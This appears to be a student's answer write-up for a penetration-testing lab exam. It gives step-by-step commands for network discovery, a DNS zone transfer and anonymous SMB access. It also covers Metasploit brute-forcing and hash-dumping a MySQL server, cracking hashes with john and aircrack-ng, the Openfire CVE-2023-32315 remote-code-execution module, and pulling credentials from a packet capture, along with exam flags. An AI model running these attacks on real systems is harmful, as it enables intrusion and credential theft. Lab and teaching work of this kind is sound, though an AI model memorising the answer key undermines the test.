# QUESTION 1

Text: Note the subnet in CIDR notation

Solution:

`ip a` - get ip address along with netmask (192.168.30.11/22) as example

then do `ipcalc 192.168.30.11/22` and see the different values. You probably need the value like "Network" (and notice the HostMin) 

Answer: 192.168.28.0/22

# QUESTION 2

Text: What is the default gateway on the network?

Solution:

`ip r` will give us the route

Look for default via .... etc.

Answer: 192.168.28.15

# QUESTION 3

Text: What is the domain name?

Solution: 

`cat /etc/resolv.conf`

Will give you the name of the DNS server and the IP address of it.

Answer: who.lan (192.168.28.5 - also DC as long as I remember)

# QUESTION 4

Text: Number of hosts up? (consider only 100 IP's)

Solution:

`sudo nmap -sn 192.168.28.1-100` (notice the HostMin from ipcalc)

Answer: 7 (either count or see the number down below)

# QUESTION 5

Text: What is the NIC vendor for the penultimate IP address (meaning the highest, but the one before it)

Solution:

`sudo nmap <ip>` and get the MAC address resolver

Answer: Lenovo (???)

# QUESTION 6

Text: what is the FQDN of IP address that ends with .18

Solution:

Find the ip address

`sudo nmap 192.168.28.18` and get the full report and at the top you will see the full name like `catalog.vault.vinyl`

Answer: rivers-diary.who.lan

# QUESTION 7

Text: Show the full DNS content and find a flag in there

Solution:

you can either try `dnsrecon -d who.lan`

but for me it worked `dig axfr @192.168.28.5 who.lan` (so dig for pretty much everything, for the DNS server and domain name)

Inside there you will see a TXT record that will say flag

Answer: EXAM{339079}

# QUESTION 8

Text: One of the hosts is running some software on the standart HTTP port (80), name the software (Example: SonarQube)

Solution: 

`sudo nmpa 192.168.28.1-100 -p80` and see for which IP addresses its open (in this case it was 2 IP's i guess)

Then find `sudo nmap -sV 192.168.28.24` and look for the services

It has open port 80 and was running `nginx 1.22.1`

But if you navigate there, then you will get to a page that says `Openfire`.

So here I was in doubt and initially put `Openfire` (probably correct one), but then changed it to `nginx`

Solution: Openfire || nginx

# QUESTION 9

Text: Server that ends with .18 runs a database. What is the name of the software? (Example: MS Access vX.Y.Z)

Solutions:

`sudo nmap -sV 192.168.28.18` - notice the service with MySQL and then the version on the right. It said MySQL 8.0.36 (and then full form was MySQL 8.0.36-0ubuntu0-22.04.1)

Answer: MySQL 8.0.36

# QUESTION 10

Text: There is a network share available anonymously on one of the host. Find it and read the contents of a file there.

Solution:

Either look for ports 21 or 2121,  maybe FTP services. But that did not work.

`showmount -e <ip>` or `showmount -e who.lan` would hang and not work.

But `smb` can also allow anonymous shit.

Hence you can do `smbclient -L //192.168.28.1` (to list the shared folders on the network)

Then it will prompt you for password, just press Enter.

You will see some directories with $namehere but we need the one that said `SomeScrewdriverData`

Then do `smbclient //192.168.28.1/SomeScrewdriverData -c "ls"` (-c for command to be executed)

You will be prompted to enter password but just press Enter and you get the contents

Look for file called `exam.txt` in this case

Then do `smbclient //192.168.28.1/SomeScrewdriverData -c "get exam.txt"` (make sure to be in any of your directories except / on Kali)

Then run `cat exam.txt` and get the flag.

Answer: EXAM{959930}

# QUESTION 11

Text: The database from .18 can be bruteforced by an online attack using nmap wordlist. What is the password for the root user to access the database.

Solution: 

I managed to do it with `msfconsole` 

Open `msfconsole`, `search mysql`, `use auxiliary/scanner/mysql/mysql_login (or by nymber if you see it)`.

`options` or `show options`

Need to set RHOSTS, USERNAME, PASS_FILE

`set RHOSTS 192.168.28.18`

`set USERNAME root` (might be already by default)

`set PASS_FILE /usr/share/wordlists/nmap.lst`

`run` or `exploit`

Wait for a bit, and it would say that it could login with `root:titanic`

Answer: titanic

# QUESTION 12

Text: The password for root user can be used to dump passwords/user table/hashdumps whatever its called. On the user names is the flag.

Solution:

`msfconsole` 

`search mysql`

`use auxiliary/scanner/mysql/mysql_hashdump`

`options` or `show options`

Need to set PASSWORD, RHOSTS, USERNAME

`set RHOSTS 192.168.28.18`

`set PASSWORD titanic`

`set USERNAME root`

`run` or `exploit`

After some time or couple of seconds it will show you the table with like users and their hashes.

ANSWER: EXAM{620140}

# QUESTION 13

Text: Perform offline cracking of the exam user (so the one user that has the flag as name) hash, and that will be a flag. The password looks like EXAM{XXXXXX}

Solution:

Copy the hash for the user from `msfconsole`, and put it in a file inside like Documents directory

`cd ~/Documents`

`nano user_hash`

insert the hash in there

Now create the wordlist. We know that the format is like EXAM{XXXXXX} so we use `crunch` for it. It contains 12 characters in total our format

`crunch 12 12 0123456789 -t EXAM{%%%%%%} -o pw.txt` (12 for min characters, 12 for max, -t for like what it should look like. The % are placeholders for numbers, @ are for letters. -o for output into a file)

Then put the same files in the same directory and run

`john user_hash --wordlist=pw.txt`

After a couple of seconds you will be shown the correct password.

If not, do `john --show user_hash` and it will show you the cracked password it got.

Answer: EXAM{109929}

# QUESTION 14

Text: The software on the .24 is vulnerable to RCE. Find the exploit, use it, and read the contents of `exam.txt`.

Solution:

As said, it was running `Openfire` if you navigate there.

Open `msfconsole`

`search openfire`

`use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315`

`options` or `show options`

`set RHOSTS 192.168.28.24`

`set LHOST <your_ip>`

`run` or `exploit`

Wait a bit till it says that it opened a session

Do `ls`

Then `cat exam.txt`

Answer: EXAM{618982}

# QUESTION 15 (captures)

Text: In the first capture, we need to crack the password for one of the networks, to then read some contents from the same capture. The password looks the same as EXAM{XXXXXX}

Solution:

Download the capture (go on the IP address from your Kali and you will get the file)

Then open the Downloads directory, and run

`aircrack-ng -w pw.txt wificapexam-01.cap`

Since we still know that the password is similar format, reuse the same wordlist

It will ask you which network to crack, choose the one that has an Encryption specified unlike the others (check leho example as well)

After some time, you get the password.

Answer: EXAM{001754}

# QUESTION 16

Text: One of the networks does not use encryption (from the first capture). What is the BSSID, SSID, and channel for it?

Solution: I COULD NOT SOLVE IT BEFORE I ENDED

Easy way: run `airodump-ng -r wificapexam-01.cap` (this was not shown by teacher before it.) Then Select the one that does have ENC set to OPN. In this case it was the second one by number

Harder way: open in wireshark the capture, then probably no need to put password in preferences. See the very first broadcast destination packets. Click through them, and see which of them DOES NOT have the IEEE 802.11 Wirelless Management > Tagged Parameters > Tag RSN Information. That one does not have encryption and then you can find the other values.

# QUESTION 18

Text: In the second capture you can find some user credentials, what is the password?

Solution:

Open second capture in wireshark, and filter at the top for `ldap`. Scan through them and open the tags at the bottom left until you find the packet where it specifies the user name like `toymaker@who.lan` and then you will be able to see the password. Check lab environment for it too.

Answer: G4meOfC4tch

# LAST QUESTIONS

For the last questions it was about windows machines. One is client, the other one is DC. Both of them have files that we need to read. For one of them you could connect to the ssh service because we have user and password. For the second one use crackmapexec but with --get-files option. Needs some testing but both questions were worth 2 points each.


